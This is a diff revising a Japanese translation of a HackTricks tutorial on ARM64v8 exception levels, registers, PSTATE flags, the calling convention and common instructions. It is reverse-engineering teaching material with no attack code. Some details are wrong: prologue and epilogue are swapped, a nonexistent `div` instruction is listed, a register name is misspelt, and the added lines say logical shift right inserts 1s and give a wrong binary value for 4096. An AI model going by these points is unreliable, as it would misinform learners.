@@ -1,230 +1,231 @@
-# ARM64v8 入門
+# ARM64v8の概要
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 
-## **例外レベル - EL (ARM64v8)**
+## **例外レベル - EL（ARM64v8）**
 
-ARMv8 アーキテクチャでは、実行レベルは Exception Levels（EL）として知られており、実行環境の特権レベルと機能を定義します。EL0 から EL3 までの 4 つの例外レベルがあり、それぞれ異なる目的を持ちます：
+ARMv8アーキテクチャでは、Exception Levels（EL）と呼ばれる実行レベルによって、実行環境の権限レベルと機能が定義されます。例外レベルはEL0からEL3までの4つあり、それぞれ異なる目的で使用されます。
 
 1. **EL0 - User Mode**:
-- これは最も権限の低いレベルで、通常のアプリケーションコードの実行に使われます。
-- EL0 で動作するアプリケーションは互いに、またシステムソフトウェアからも隔離されており、セキュリティと安定性が向上します。
+- 最も権限の低いレベルで、通常のアプリケーションコードの実行に使用されます。
+- EL0で実行されるアプリケーションは、互いに分離され、さらにシステムソフトウェアからも分離されるため、セキュリティと安定性が向上します。
 2. **EL1 - Operating System Kernel Mode**:
-- ほとんどのオペレーティングシステムカーネルはこのレベルで動作します。
-- EL1 は EL0 より多くの特権を持ち、システムリソースにアクセスできますが、システムの整合性を保つためにいくつかの制限があります。EL0 から EL1 へは SVC 命令で移行します。
+- ほとんどのOS kernelはこのレベルで実行されます。
+- EL1はEL0より多くの権限を持ち、システムリソースにアクセスできますが、システムの完全性を確保するため、いくつかの制限があります。EL0からEL1へはSVC instructionを使用して移行します。
 3. **EL2 - Hypervisor Mode**:
-- このレベルは仮想化に使用されます。EL2 で動作するハイパーバイザは、同じ物理ハードウェア上で複数の OS（それぞれが EL1）を管理できます。
-- EL2 は仮想化された環境の隔離と制御のための機能を提供します。
-- そのため Parallels のような仮想マシンアプリケーションは `hypervisor.framework` を使って EL2 とやり取りし、カーネル拡張を必要とせずに仮想マシンを実行できます。
-- EL1 から EL2 へ移動するには `HVC` 命令が使われます。
+- このレベルはvirtualizationに使用されます。EL2で実行されるhypervisorは、同じ物理ハードウェア上で実行される複数のOS（それぞれ独自のEL1上で実行）を管理できます。
+- EL2は、virtualized environmentの分離と制御のための機能を提供します。
+- そのため、Parallelsのようなvirtual machine applicationは`hypervisor.framework`を使用してEL2とやり取りし、kernel extensionを必要とせずにvirtual machineを実行できます。
+- EL1からEL2へ移行するには、`HVC` instructionを使用します。
 4. **EL3 - Secure Monitor Mode**:
-- これは最も特権の高いレベルで、セキュアブートやトラステッド実行環境にしばしば使用されます。
-- EL3 はセキュアと非セキュア状態間のアクセス（セキュアブート、トラステッド OS など）を管理・制御できます。
-- かつて macOS の KPP (Kernel Patch Protection) に利用されていましたが、現在は使用されていません。
-- Apple はもはや EL3 を使用していません。
-- EL3 への遷移は通常 `SMC`（Secure Monitor Call）命令によって行われます。
+- 最も権限の高いレベルで、secure bootやtrusted execution environmentによく使用されます。
+- EL3は、secure stateとnon-secure state間のアクセス（secure boot、trusted OSなど）を管理・制御できます。
+- macOSではKPP（Kernel Patch Protection）に使用されていましたが、現在は使用されていません。
+- AppleではEL3を現在使用していません。
+- EL3への移行は通常、`SMC`（Secure Monitor Call）instructionを使用して行われます。
 
-これらのレベルの利用により、ユーザーアプリケーションから最も特権の高いシステムソフトウェアまで、システムの異なる側面を構造的かつ安全に管理できます。ARMv8 の特権レベルへのアプローチは、異なるシステムコンポーネントを効果的に分離し、システムのセキュリティと堅牢性を向上させます。
+これらのレベルを使用することで、user applicationから最も権限の高いsystem softwareまで、システムのさまざまな要素を構造化された安全な方法で管理できます。ARMv8の権限レベルというアプローチは、異なるsystem componentを効果的に分離し、システムのセキュリティと堅牢性を高めます。
 
-## **レジスタ (ARM64v8)**
+## **Registers（ARM64v8）**
 
-ARM64 には **31 個の汎用レジスタ** があり、`x0` から `x30` とラベル付けされています。各レジスタは **64 ビット**（8 バイト）の値を格納できます。32 ビット値のみを扱う操作では、同じレジスタを 32 ビットモードで `w0` から `w30` の名前で参照できます。
+ARM64には、`x0`から`x30`までラベル付けされた**31個のgeneral-purpose register**があります。それぞれ**64ビット**（8バイト）の値を格納できます。32ビット値のみを必要とする操作では、同じregisterをw0からw30という名前で32ビットmodeでアクセスできます。
 
-1. **`x0`** から **`x7`** - これらは通常スクラッチレジスタやサブルーチンへのパラメータ渡しに使われます。
-- **`x0`** は関数の戻り値も運びます。
-2. **`x8`** - Linux カーネルでは `x8` が `svc` 命令のシステムコール番号として使われます。**macOS では x16 が使われます！**
-3. **`x9`** から **`x15`** - より多くの一時レジスタで、ローカル変数に使われることが多いです。
-4. **`x16`** と **`x17`** - **Intra-procedural Call Registers**。即値用の一時レジスタです。間接関数呼び出しや PLT スタブにも使われます。
-- **`x16`** は **macOS** における **`svc`** 命令の **システムコール番号** に使われます。
-5. **`x18`** - **Platform register**。汎用レジスタとして使えますが、いくつかのプラットフォームではプラットフォーム固有の用途に予約されています：Windows では現在のスレッド環境ブロックへのポインタ、Linux カーネルでは現在実行中のタスク構造体へのポインタなど。
-6. **`x19`** から **`x28`** - これらは callee-saved レジスタです。関数はこれらの値を呼び出し元のために保存する必要があるため、スタックに保存して呼び出し元に戻る前に復元します。
-7. **`x29`** - **Frame pointer**。スタックフレームを追跡するために使用されます。関数呼び出しで新しいスタックフレームが作られると、`x29` レジスタは **スタックに格納され**、新しいフレームポインタアドレス（`sp` アドレス）がこのレジスタに格納されます。
-- このレジスタは通常ローカル変数の参照として使われますが、汎用レジスタとしても使えます。
-8. **`x30`** または **`lr`** - **Link register**。`BL`（Branch with Link）や `BLR`（Branch with Link to Register）命令が実行されると、`pc` の値をこのレジスタに格納して **戻りアドレス** を保持します。
-- 他のレジスタと同様に使用することもできます。
-- 現在の関数が新しい関数を呼び出して `lr` を上書きする場合、関数の先頭でスタックに保存します。これがエピローグ（`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` と `lr` を保存し、領域を確保して新しい `fp` を設定）であり、終了時に復元するのがプロローグ（`ldp x29, x30, [sp], #48; ret` -> `fp` と `lr` を復元して return）です。
-9. **`sp`** - **Stack pointer**。スタックの先頭を追跡するために使われます。
-- `sp` の値は少なくとも **quadword アラインメント** を保つ必要があり、そうでないとアラインメント例外が発生する可能性があります。
-10. **`pc`** - **Program counter**。次の命令を指します。このレジスタは例外発生、例外復帰、ブランチによってのみ更新されます。通常の命令でこのレジスタを読み取れるものは、`BL` や `BLR` のように `pc` アドレスを `lr` に格納するブランチ命令だけです。
-11. **`xzr`** - **Zero register**。32 ビット版では **`wzr`** と呼ばれます。ゼロ値を簡単に取得する（一般的な操作）ためや、`subs` のような比較で結果をどこにも格納しない用途に使えます（例：`subs XZR, Xn, #10`）。
+1. **`x0`**から**`x7`** - これらは通常、scratch registerおよびsubroutineへparameterを渡すために使用されます。
+- **`x0`**にはfunctionのreturn dataも格納されます。
+2. **`x8`** - Linux kernelでは、`x8`は`svc` instructionのsystem call numberとして使用されます。**macOSではx16が使用されます！**
+3. **`x9`**から**`x15`** - 追加のtemporary registerで、local variableによく使用されます。
+4. **`x16`**と**`x17`** - **Intra-procedural Call Register**。immediate value用のtemporary registerです。indirect function callやPLT（Procedure Linkage Table）stubにも使用されます。
+- macOSでは、**`x16`**が**`svc`** instructionの**system call number**として使用されます。
+5. **`x18`** - **Platform register**。general-purpose registerとして使用できますが、一部のplatformではplatform固有の用途に予約されています。Windowsではcurrent thread environment blockへのpointer、Linux kernelでは現在**実行中のtask structure**を指すために使用されます。
+6. **`x19`**から**`x28`** - これらはcallee-saved registerです。functionはcallerのためにこれらのregisterの値を保持する必要があるため、stackに保存し、callerへ戻る前に復元します。
+7. **`x29`** - stack frameを追跡するための**frame pointer**です。function callによって新しいstack frameが作成されると、**`x29`** registerが**stackに保存**され、**新しい**frame pointer address（**`sp`** address）がこのregisterに保存されます。
+- このregisterは**general-purpose register**としても使用できますが、通常は**local variable**へのreferenceとして使用されます。
+8. **`x30`**または**`lr`** - **Link register**。`BL`（Branch with Link）または`BLR`（Branch with Link to Register）instructionが実行されると、**`pc`**の値をこのregisterに保存して**return address**を保持します。
+- 他のregisterと同様に使用することもできます。
+- 現在のfunctionが新しいfunctionをcallし、その結果`lr`を上書きする場合、最初にstackへ保存します。これがepilogueです（`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp`と`lr`を保存し、領域を確保して新しい`fp`を取得）。最後に復元します。これがprologueです（`ldp x29, x30, [sp], #48; ret` -> `fp`と`lr`を復元してreturn）。
+9. **`sp`** - stackの先頭を追跡するための**Stack pointer**です。
+- **`sp`**の値は常に少なくとも**quadword**境界に**alignment**されている必要があり、そうでなければalignment exceptionが発生する可能性があります。
+10. **`pc`** - 次のinstructionを指す**Program counter**です。このregisterは、exception generation、exception return、branchによってのみ更新できます。このregisterを読み取れる通常のinstructionは、branch with link instruction（BL、BLR）だけです。これらは**`pc`** addressを**`lr`**（Link Register）に保存します。
+11. **`xzr`** - **Zero register**。32ビットregister形式では**`wzr`**とも呼ばれます。簡単にzero valueを取得する（一般的な操作）ため、または**`subs`**を使用した比較（`subs XZR, Xn, #10`のように、結果をどこにも保存しない）に使用できます。
 
-**`Wn`** レジスタは **`Xn`** レジスタの **32bit** 版です。
+**`Wn`** registerは、**`Xn`** registerの**32ビット版**です。
 
 > [!TIP]
-> `X0` - `X18` のレジスタは揮発性（volatile）で、関数呼び出しや割り込みによって値が変わる可能性があります。一方、`X19` - `X28` は非揮発性（non-volatile）で、関数呼び出し間でその値を保持する必要があります（"callee saved"）。
+> X0 - X18のregisterはvolatileです。つまり、function callやinterruptによって値が変更される可能性があります。一方、X19 - X28のregisterはnon-volatileであり、function callをまたいで値を保持する必要があります（"callee saved"）。
 
-### SIMD と 浮動小数点レジスタ
+### SIMDおよびFloating-Point Register
 
-さらに、最適化された単一命令マルチプルデータ（SIMD）操作や浮動小数点演算に使える **128bit 長さの 32 個のレジスタ** があり、これらは Vn レジスタと呼ばれます。これらはまた **64bit**, **32bit**, **16bit**, **8bit** で動作することができ、その場合はそれぞれ **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`**, **`Bn`** と呼ばれます。
+さらに、optimized single instruction multiple data（SIMD）操作やfloating-point arithmeticに使用できる、長さ128ビットの**32個のregister**があります。これらはVn registerと呼ばれますが、**64**ビット、**32**ビット、**16**ビット、**8**ビットとしても操作でき、その場合はそれぞれ**`Qn`**、**`Dn`**、**`Sn`**、**`Hn`**、**`Bn`**と呼ばれます。
 
-### システムレジスタ
+### System Register
 
-**何百ものシステムレジスタ**（特殊目的レジスタ、SPR）があり、プロセッサの動作を監視・制御するために使われます。\
-これらは専用の特殊命令 `mrs` と `msr` を使ってのみ読み書きできます。
+**数百個のsystem register**（special-purpose register、SPRsとも呼ばれます）があり、**processor**の動作の**monitoring**と**control**に使用されます。\
+これらは専用のspecial instructionである**`mrs`**と**`msr`**を使用した場合のみ、読み取りまたは設定が可能です。
 
-特殊レジスタの **`TPIDR_EL0`** と **`TPIDDR_EL0`** はリバースエンジニアリング時によく見られます。`EL0` サフィックスはそのレジスタにアクセス可能な最小の例外レベルを示します（この場合 EL0 は通常のアプリが動作する通常の例外（特権）レベルです）。\
-これらはしばしばスレッドローカルストレージ領域のベースアドレスを格納するために使われます。通常、最初のものは EL0 のプログラムから読み書き可能ですが、二つ目は EL0 から読み取り、EL1（カーネル）から書き込み可能であることが多いです。
+special registerの**`TPIDR_EL0`**と**`TPIDDR_EL0`**は、reverse engineeringでよく見られます。`EL0` suffixは、そのregisterにアクセス可能な**最小のexception level**を示します（この場合、EL0は通常のprogramが実行される通常のexception（privilege）levelです）。\
+これらは、thread-local storage領域のmemoryの**base address**を保存するためによく使用されます。通常、最初のregisterはEL0で実行されるprogramからread/write可能ですが、2番目はEL0からreadでき、EL1（kernelなど）からwriteできます。
 
 - `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
 - `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`
 
 ### **PSTATE**
 
-**PSTATE** はいくつかのプロセス状態コンポーネントをオペレーティングシステムから見える特別レジスタ **`SPSR_ELx`** にシリアライズして格納します。ここで X はトリガーされた例外の **権限レベル** を示します（これは例外終了時にプロセス状態を復元するためです）。\
-アクセス可能なフィールドは次の通りです：
+**PSTATE**には、複数のprocess componentが、OSから見える**`SPSR_ELx`** special registerにserializedされた状態で格納されます。Xは、triggerされたexceptionの**permission** **level**を示します（これにより、exception終了時にprocess stateを復元できます）。\
+アクセス可能なfieldは次のとおりです。
 
 <figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>
 
-- **`N`**, **`Z`**, **`C`**, **`V`** 条件フラグ：
-- **`N`** は演算が負の結果を生んだことを示します
-- **`Z`** は演算がゼロを生んだことを示します
-- **`C`** はキャリーが発生したことを示します
-- **`V`** は符号付きオーバーフローが発生したことを示します：
-- 2 つの正の数の和が負の結果になる場合
-- 2 つの負の数の和が正の結果になる場合
-- 減算において、大きな負の数から小さな正の数を引く（またはその逆）などで、結果が与えられたビット数で表現できない場合
-- プロセッサは演算が符号付きか符号無しかを知らないため、演算で C と V を確認して、符号付きか符号無しかに応じてキャリーの発生を示します。
+- **`N`**、**`Z`**、**`C`**、**`V`** condition flag:
+- **`N`**は、operationがnegative resultを返したことを示します。
+- **`Z`**は、operationがzeroを返したことを示します。
+- **`C`**は、operationでcarryが発生したことを示します。
+- **`V`**は、operationでsigned overflowが発生したことを示します。
+- 2つのpositive numberの合計がnegative resultになる。
+- 2つのnegative numberの合計がpositive resultになる。
+- subtractionで、大きなnegative numberを小さなpositive numberから（またはその逆に）減算し、結果が指定されたbit sizeの範囲内で表現できない場合。
+- processorは、operationがsignedかunsignedかを認識しないため、operationでCとVを確認し、signedまたはunsignedの場合にcarryが発生したかどうかを示します。
 
 > [!WARNING]
-> すべての命令がこれらのフラグを更新するわけではありません。`CMP` や `TST` のような命令、あるいは末尾に s が付く `ADDS` のようなものはフラグを更新します。
+> すべてのinstructionがこれらのflagを更新するわけではありません。**`CMP`**や**`TST`**などは更新し、**`ADDS`**のようにs suffixを持つinstructionも更新します。
 
-- 現在の **レジスタ幅（`nRW`）フラグ**：このフラグが 0 の場合、プログラムは再開時に AArch64 実行状態で動作します。
-- 現在の **Exception Level（`EL`）**：EL0 で動作する通常プログラムは値 0 を持ちます。
-- **単一ステップ（`SS`）フラグ**：デバッガが例外を介して `SPSR_ELx` 内の SS フラグを 1 に設定することで単一ステップを実行します。プログラムはステップを実行し、シングルステップ例外を発行します。
-- **不正な例外状態フラグ（`IL`）**：特権ソフトウェアが不正な例外レベル移行を行ったときにこのフラグが 1 にセットされ、プロセッサは不正状態例外をトリガーします。
-- **`DAIF` フラグ**：これらのフラグは特権プログラムが特定の外部例外を選択的にマスクすることを許します。
-- **`A`** が 1 の場合は非同期アボート（asynchronous aborts）がトリガーされます。**`I`** は外部ハードウェア割り込み要求（IRQ）への応答を設定し、**`F`** は Fast Interrupt Requests（FIR）に関連します。
-- **スタックポインタ選択フラグ（`SPS`）**：EL1 以上で動作する特権プログラムは自身のスタックポインタレジスタとユーザモデルのもの（例：`SP_EL1` と `EL0`）の間を切り替えることができます。この切り替えは `SPSel` 特殊レジスタへの書き込みによって行われます。EL0 からは行えません。
+- 現在の**register width（`nRW`）flag**：flagの値が0の場合、programはresume後にAArch64 execution stateで実行されます。
+- 現在の**Exception Level**（**`EL`**）：EL0で実行される通常のprogramでは値が0になります。
+- **single stepping** flag（**`SS`**）：debuggerがsingle stepを行うために使用します。exceptionを通じて**`SPSR_ELx`**内のSS flagを1に設定すると、programは1 step実行した後、single step exceptionを発生させます。
+- **illegal exception** state flag（**`IL`**）：privileged softwareが無効なexception level transferを実行した際にマークするために使用されます。このflagが1に設定され、processorはillegal state exceptionをtriggerします。
+- **`DAIF`** flag：これらのflagにより、privileged programは特定のexternal exceptionを選択的にmaskできます。
+- **`A`**が1の場合、**asynchronous abort**がtriggerされます。**`I`**はexternal hardware **Interrupt Requests**（IRQ）への応答を設定します。Fは**Fast Interrupt Requests**（FIR）に関連します。
+- **stack pointer select** flag（**`SPS`**）：EL1以上で実行されるprivileged programは、自身のstack pointer registerとuser-modelのstack pointer（例：`SP_EL1`と`EL0`）を切り替えられます。この切り替えは**`SPSel`** special registerへの書き込みによって実行されます。EL0からは実行できません。
 
-## **呼び出し規約 (ARM64v8)**
+## **Calling Convention（ARM64v8）**
 
-ARM64 の呼び出し規約では、関数への最初の 8 個のパラメータはレジスタ `x0` から `x7` に渡されます。追加のパラメータはスタックに渡されます。戻り値は `x0` に返され、128 ビットの戻り値は `x1` も使われます。`x19` から `x30` と `sp` のレジスタは関数呼び出し間で保存する必要があります。
+ARM64 calling conventionでは、functionの**最初の8個のparameter**は**`x0`**から**`x7`**のregisterに渡されます。**追加の**parameterは**stack**に渡されます。**return** valueは**`x0`** registerに返され、**128ビット長**の場合は**`x1`**にも返されます。**`x19`**から**`x30`**および**`sp`** registerは、function callをまたいで**保持**する必要があります。
 
-アセンブリで関数を見るときは、**プロローグ**と**エピローグ**を探してください。プロローグは通常 **リンクレジスタ（`x29`）の保存**、**新しいフレームポインタの設定**、および **スタック領域の確保** を伴います。エピローグは保存したフレームポインタの復元と関数からの復帰を伴います。
+assemblyでfunctionを読む場合は、**function prologueとepilogue**を探します。**prologue**では通常、**frame pointer（`x29`）を保存**し、**新しいframe pointerを設定**して、**stack領域を確保**します。**epilogue**では通常、保存されたframe pointerを**復元**し、functionから**return**します。
 
-### Swift における呼び出し規約
+### SwiftのCalling Convention
 
-Swift は独自の **呼び出し規約** を持っており、詳細は次で確認できます: [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
+Swiftには独自の**calling convention**があり、[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)で確認できます。
 
-## **一般的な命令 (ARM64v8)**
+## **Common Instructions（ARM64v8）**
 
-ARM64 命令は一般に **`opcode dst, src1, src2`** の形式を持ち、`opcode` は実行される操作（`add`, `sub`, `mov` など）、`dst` は結果が格納される宛先レジスタ、`src1` と `src2` はソースレジスタです。即値をソースの代わりに使うこともできます。
+ARM64 instructionは一般に**`opcode dst, src1, src2`**という形式です。ここで**`opcode`**は実行するoperation（`add`、`sub`、`mov`など）、**`dst`**は結果を保存する**destination** register、**`src1`**と**`src2`**は**source** registerです。source registerの代わりにimmediate valueも使用できます。
 
-- **`mov`**: レジスタから別のレジスタへ値を移動します。
-- 例: `mov x0, x1` — `x1` の値を `x0` に移します。
-- **`ldr`**: メモリからレジスタへ値をロードします。
-- 例: `ldr x0, [x1]` — `x1` が指すメモリ位置から値を読み `x0` に格納します。
-- **オフセットモード**: 起点ポインタにオフセットを指定する例：
-- `ldr x2, [x1, #8]` は `x1 + 8` の位置の値を `x2` にロードします
-- `ldr x2, [x0, x1, lsl #2]` は配列 `x0` の `x1`（インデックス）位置から（*4）に相当するオブジェクトを `x2` にロードします
-- **プリインデックスモード**: 計算を起点に適用し、結果を起点にも保存します。
-- `ldr x2, [x1, #8]!` は `x1 + 8` を `x2` にロードし、`x1` に `x1 + 8` を格納します
-- `str lr, [sp, #-4]!` はリンクレジスタを `sp` に格納し `sp` を更新します
-- **ポストインデックスモード**: 前者と似ていますが、メモリアドレスにアクセスした後でオフセットを計算して保存します。
-- `ldr x0, [x1], #8` は `x1` を `x0` にロードし、その後 `x1` を `x1 + 8` に更新します
-- **PC 相対アドレッシング**: この場合、ロードするアドレスは PC レジスタに相対して計算されます
-- `ldr x1, =_start` は現在の PC に関連して `_start` シンボルの開始アドレスを `x1` にロードします。
-- **`str`**: レジスタの値をメモリにストアします。
-- 例: `str x0, [x1]` — `x0` の値を `x1` が指すメモリ位置に格納します。
-- **`ldp`**: 連続するメモリ位置から 2 つのレジスタをロードします（Load Pair）。
-- 例: `ldp x0, x1, [x2]` — `x2` と `x2 + 8` の位置から `x0` と `x1` をそれぞれロードします。
-- **`stp`**: 連続するメモリ位置へ 2 つのレジスタをストアします（Store Pair）。
-- 例: `stp x0, x1, [sp]` — `x0` と `x1` を `sp` と `sp + 8` の位置に格納します。
-- `stp x0, x1, [sp, #16]!` — `x0` と `x1` を `sp+16` および `sp+24` に格納し、`sp` を `sp+16` に更新します。
-- **`add`**: 2 つのレジスタの値を加算して結果をレジスタに格納します。
-- 構文: add(s) Xn1, Xn2, Xn3 | #imm, [shift #N | RRX]
-- Xn1 -> 宛先
-- Xn2 -> オペランド 1
-- Xn3 | #imm -> オペランド 2（レジスタまたは即値）
-- [shift #N | RRX] -> シフトを行うか RRX を呼ぶ
-- 例: `add x0, x1, x2` — `x1` と `x2` の値を加算して `x0` に格納します。
-- `add x5, x5, #1, lsl #12` — これは 4096 に相当します（1 を 12 ビット左シフト）。
-- **`adds`**: `add` を行いフラグを更新します。
-- **`sub`**: 2 つのレジスタの値を減算して結果をレジスタに格納します。
-- `add` の構文を参照してください。
-- 例: `sub x0, x1, x2` — `x1` から `x2` を引いて結果を `x0` に格納します。
-- **`subs`**: `sub` と同様ですがフラグを更新します。
-- **`mul`**: 2 つのレジスタの値を乗算して結果をレジスタに格納します。
-- 例: `mul x0, x1, x2` — `x1` と `x2` を乗算して `x0` に格納します。
-- **`div`**: あるレジスタの値を別のレジスタで除算して結果をレジスタに格納します。
-- 例: `div x0, x1, x2` — `x1` を `x2` で割って結果を `x0` に格納します。
-- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
-- **Logical shift left**: 末尾に 0 を追加して他のビットを前方に移動（2 倍の乗算に相当）
-- **Logical shift right**: 先頭に 0 を追加して他のビットを後方に移動（符号無しで n 回 2 で割る）
-- **Arithmetic shift right**: `lsr` に似ていますが、最上位ビットが 1 の場合は 1 を追加します（符号付きで n 回 2 で割る）
-- **Rotate right**: `lsr` に似ていますが、右から取り除かれたビットが左端に付加されます
-- **Rotate Right with Extend**: `ror` に似ていますが、キャリーフラグが「最上位ビット」として使われます。キャリーフラグがビット 31 に移動し、取り除かれたビットがキャリーフラグに入ります。
-- **`bfm`**: Bit Field Move。これらの操作はある値のビット `0...n` をコピーして位置 `m..m+n` に配置します。`#s` は左端のビット位置を、`#r` は右回転量を指定します。
+- **`mov`**：あるregisterから別のregisterへ値を**Move**します。
+- 例：`mov x0, x1` — `x1`の値を`x0`へ移動します。
+- **`ldr`**：**memory**から値を**Load**してregisterに格納します。
+- 例：`ldr x0, [x1]` — `x1`が指すmemory locationから値をloadして`x0`に格納します。
+- **Offset mode**：origin pointerに影響するoffsetは、次のように指定します。
+- `ldr x2, [x1, #8]`では、`x1 + 8`の値をx2にloadします。
+- `ldr x2, [x0, x1, lsl #2]`では、x0のarrayから、位置x1（index）\* 4にあるobjectをx2にloadします。
+- **Pre-indexed mode**：originに対して計算を行い、結果を取得すると同時に、新しいoriginをoriginに保存します。
+- `ldr x2, [x1, #8]!`では、`x1 + 8`を`x2`にloadし、`x1`に`x1 + 8`の結果を保存します。
+- `str lr, [sp, #-4]!`では、link registerをspに保存し、register spを更新します。
+- **Post-index mode**：前のmodeと似ていますが、memory addressへアクセスした後にoffsetを計算して保存します。
+- `ldr x0, [x1], #8`では、`x1`を`x0`にloadし、x1を`x1 + 8`で更新します。
+- **PC-relative addressing**：この場合、loadするaddressはPC registerを基準に計算されます。
+- `ldr x1, =_start`では、`_start` symbolの開始位置のaddressを、現在のPCを基準にx1へloadします。
+- **`str`**：registerの値を**memory**へ**Store**します。
+- 例：`str x0, [x1]` — `x0`の値を`x1`が指すmemory locationに保存します。
+- **`ldp`**：**Load Pair of Registers**。このinstructionは、**連続したmemory** locationから2つのregisterを**load**します。memory addressは通常、別のregisterの値にoffsetを加算して形成されます。
+- 例：`ldp x0, x1, [x2]` — `x2`および`x2 + 8`のmemory locationから、それぞれ`x0`と`x1`をloadします。
+- **`stp`**：**Store Pair of Registers**。このinstructionは、2つのregisterを**連続したmemory** locationへ**store**します。memory addressは通常、別のregisterの値にoffsetを加算して形成されます。
+- 例：`stp x0, x1, [sp]` — `x0`と`x1`を、それぞれ`sp`と`sp + 8`のmemory locationに保存します。
+- `stp x0, x1, [sp, #16]!` — `x0`と`x1`を、それぞれ`sp+16`と`sp + 24`のmemory locationに保存し、`sp`を`sp+16`で更新します。
+- **`add`**：2つのregisterの値を**Add**し、結果をregisterに保存します。
+- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
+- Xn1 -> Destination
+- Xn2 -> Operand 1
+- Xn3 | #imm -> Operand 2 (registerまたはimmediate)
+- \[shift #N | RRX] -> shiftを実行、またはRRXをcall
+- 例：`add x0, x1, x2` — `x1`と`x2`の値を加算し、結果を`x0`に保存します。
+- `add x5, x5, #1, lsl #12` — これは4096（1を12回shiftした値）と等しくなります -> 1 0000 0000 0000 0000
+- **`adds`**：`add`を実行し、flagを更新します。
+- **`sub`**：2つのregisterの値を**Subtract**し、結果をregisterに保存します。
+- **`add`**の**syntax**を参照してください。
+- 例：`sub x0, x1, x2` — `x1`から`x2`の値を減算し、結果を`x0`に保存します。
+- **`subs`**：`sub`と同じですが、flagを更新します。
+- **`mul`**：**2つのregister**の値を**Multiply**し、結果をregisterに保存します。
+- 例：`mul x0, x1, x2` — `x1`と`x2`の値を乗算し、結果を`x0`に保存します。
+- **`div`**：一方のregisterの値を別のregisterの値で**Divide**し、結果をregisterに保存します。
+- 例：`div x0, x1, x2` — `x1`の値を`x2`で除算し、結果を`x0`に保存します。
+- **`lsl`**、**`lsr`**、**`asr`**、**`ror`、`rrx`**：
+- **Logical shift left**：末尾から0を追加し、他のbitを前方へ移動します（2をn回掛ける）。
+- **Logical shift right**：先頭から1を追加し、他のbitを後方へ移動します（unsignedで2をn回割る）。
+- **Arithmetic shift right**：**`lsr`**と同様ですが、最上位bitが1の場合に0ではなく**1を追加**します（signedで2をn回割る）。
+- **Rotate right**：**`lsr`**と同様ですが、右から削除されたbitを左に追加します。
+- **Rotate Right with Extend**：**`ror`**と同様ですが、carry flagを「最上位bit」として扱います。carry flagをbit 31へ移動し、削除されたbitをcarry flagへ移動します。
+- **`bfm`**：**Bit Field Move**。これらのoperationは、値から**bit `0...n`**をcopyし、**`m..m+n`**のpositionへ配置します。**`#s`**は**leftmost bit** position、**`#r`**は**rotate right amount**を指定します。
 - Bitfield move: `BFM Xd, Xn, #r`
 - Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
 - Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
-- **Bitfield Extract と Insert:** レジスタからビットフィールドをコピーして別のレジスタにコピーします。
-- **`BFI X1, X2, #3, #4`** X2 の 3 ビット目から 4 ビットを X1 に挿入
-- **`BFXIL X1, X2, #3, #4`** X2 の 3 ビット目から 4 ビットを抽出して X1 にコピー
-- **`SBFIZ X1, X2, #3, #4`** X2 の 4 ビットを符号拡張して X1 のビット位置 3 から挿入し、右側のビットをゼロにします
-- **`SBFX X1, X2, #3, #4`** X2 のビット 3 から 4 ビットを抽出して符号拡張し、結果を X1 に格納します
-- **`UBFIZ X1, X2, #3, #4`** X2 の 4 ビットをゼロ拡張して X1 のビット位置 3 から挿入し、右側のビットをゼロにします
-- **`UBFX X1, X2, #3, #4`** X2 のビット 3 から 4 ビットを抽出してゼロ拡張した結果を X1 に格納します。
-- **Sign Extend To X:** 値の符号を拡張する（符号無し版は 0 を追加する）ことで、その値で演算できるようにします：
-- **`SXTB X1, W2`** W2 のバイトの符号を拡張して `X1` の 64 ビットを満たします（`W2` は `X2` の半分）
-- **`SXTH X1, W2`** 16 ビット値の符号を拡張して `X1` の 64 ビットを満たします
-- **`SXTW X1, W2`** W2 の 32 ビットの符号を拡張して `X1` の 64 ビットを満たします
-- **`UXTB X1, W2`** バイトをゼロ拡張して `X1` の 64 ビットを満たします
-- **`extr`**: 指定された 2 つのレジスタを連結したペアからビットを抽出します。
-- 例: `EXTR W3, W2, W1, #3` は `W1+W2` を連結し、W2 のビット 3 から W1 のビット 3 までを取得して W3 に格納します。
-- **`cmp`**: 2 つのレジスタを比較して条件フラグを設定します。これは `subs` のエイリアスであり、宛先レジスタをゼロレジスタに設定します。`m == n` を判定するのに便利です。
-- `subs` と同じ構文をサポートします。
-- 例: `cmp x0, x1` — `x0` と `x1` の値を比較して条件フラグを設定します。
-- **`cmn`**: ネガティブオペランドの比較。これは `adds` のエイリアスで、同じ構文をサポートします。`m == -n` を判定するのに便利です。
-- **`ccmp`**: 条件付き比較。前の比較が真であった場合にのみ実行され、特に nzcv ビットを設定します。
-- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> もし x1 != x2 かつ x3 < x4 なら func へジャンプ
-- これは `ccmp` が前の `cmp` が `NE` だった場合にのみ実行され、そうでない場合は nzcv ビットが 0 にセットされ（`blt` 条件を満たさない）ます。
-- これは `ccmn`（ネガティブ版、`cmp` と `cmn` の関係と同様）としても使えます。
-- **`tst`**: ANDS の結果をどこにも格納せずに比較するような動作で、比較したいレジスタのビットのいずれかが 1 かどうかをチェックするのに便利です。
-- 例: `tst X1, #7` は X1 の下位 3 ビットのいずれかが 1 かをチェックします。
-- **`teq`**: XOR 演算を結果を破棄して行います。
-- **`b`**: 無条件ブランチ
-- 例: `b myFunction`
-- これは戻りアドレスをリンクレジスタに格納しないことに注意（戻る必要があるサブルーチン呼び出しには不適）。
-- **`bl`**: リンク付きブランチ。サブルーチンの呼び出しに使用します。戻りアドレスを `x30` に格納します。
-- 例: `bl myFunction` — `myFunction` を呼び出し、戻りアドレスを `x30` に格納します。
